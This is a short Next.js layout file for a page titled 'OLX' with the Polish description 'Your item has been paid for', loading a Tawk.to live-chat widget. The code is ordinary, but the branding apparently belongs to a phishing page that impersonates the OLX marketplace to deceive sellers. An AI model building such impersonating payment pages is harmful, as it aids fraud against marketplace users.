// app/layout.tsx
import "./globals.css";
import { AppShell } from "./AppShell";
import "./styles/base.css";
import "./styles/layout.css";


export const metadata = {
  title: "OLX",
  description: "Twój przedmiot został opłacony",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html >
       <script
        type="text/javascript"
        dangerouslySetInnerHTML={{
          __html: `
          var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
          (function(){
          var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
          s1.async=true;
          s1.src='https://embed.tawk.to/6942e599c73adf1980aa89aa/1jcml1ofo';
          s1.charset='UTF-8';
          s1.setAttribute('crossorigin','*');
          s0.parentNode.insertBefore(s1,s0);
          })();
          `,
        }}
      />
      <body className="page-root">
        <AppShell>{children}</AppShell>
      </body>
    </html>
  );
}
